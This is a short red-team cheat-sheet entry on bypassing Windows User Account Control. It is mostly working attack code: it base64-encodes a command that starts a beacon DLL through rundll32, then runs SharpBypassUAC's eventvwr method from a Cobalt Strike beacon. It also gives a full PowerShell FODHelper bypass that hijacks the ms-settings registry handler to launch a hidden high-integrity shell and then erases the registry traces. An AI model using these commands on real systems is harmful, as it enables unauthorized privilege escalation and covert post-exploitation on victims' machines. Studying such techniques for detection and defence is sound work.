Using [SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC).

```bash
# Generate EncodedCommand
echo -n 'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update' | base64

# Use SharpBypassUAC e.g. from a CobaltStrike beacon
beacon> execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ==
```
In some cases, you may get away better with running a manual UAC bypass, such as the FODHelper bypass which is quite simple to execute in PowerShell.

```powershell
# The command to execute in high integrity context
$cmd = "cmd /c start powershell.exe"
 
# Set the registry values
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
 
# Trigger fodhelper to perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
# Clean registry
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```